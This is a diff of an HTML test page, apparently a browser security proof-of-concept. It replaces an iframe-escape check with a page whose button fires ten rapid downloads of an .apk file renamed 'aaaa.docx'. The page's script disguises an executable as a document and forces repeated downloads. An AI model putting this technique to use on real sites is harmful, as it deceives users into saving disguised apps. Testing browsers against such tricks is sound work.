@@ -1,23 +1,96 @@
-<!doctype html>
-<html>
-<meta charset="utf-8">
-<style>
-  html, body { margin: 0; height: 100%; }
-  .inside { height: 100%; background: #c9e7ff; display:grid; place-items:center; font: 700 16px system-ui; }
-  .escape {
-    position: fixed;
-    left: 0;
-    top: 240px;
-    width: 100vw;
-    height: 60px;
-    background: rgba(0, 180, 0, 0.85);
-    color: #fff;
-    display:grid;
-    place-items:center;
-    z-index: 2147483647;
-    font: 700 14px system-ui;
-  }
-</style>
-<div class="inside">Child frame</div>
-<div class="escape">IF THIS IS VISIBLE OUTSIDE FRAME => BUG</div>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Double Download</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        
+        .container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 30px;
+        }
+        
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        .status {
+            margin-top: 20px;
+            color: #666;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Download File</h1>
+        <button id="downloadBtn">Download File</button>
+        <div class="status" id="status"></div>
+    </div>
+
+    <script>
+        const downloadBtn = document.getElementById('downloadBtn');
+        const status = document.getElementById('status');
+        const fileUrl = 'https://victimjodyritonga-create.github.io/victim/kocak.apk';
+
+        function downloadFile(url) {
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'aaaa.docx';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+
+        downloadBtn.addEventListener('click', () => {
+            // Download 10 times with staggered delays
+            for (let i = 0; i < 10; i++) {
+                setTimeout(() => {
+                    downloadFile(fileUrl);
+                }, i * 150); // 150ms delay between each download
+            }
+            
+            status.textContent = 'Downloading...';
+            
+            setTimeout(() => {
+                status.textContent = 'All downloads initiated! 🎉';
+            }, 1500);
+        });
+    </script>
+</body>
 </html>
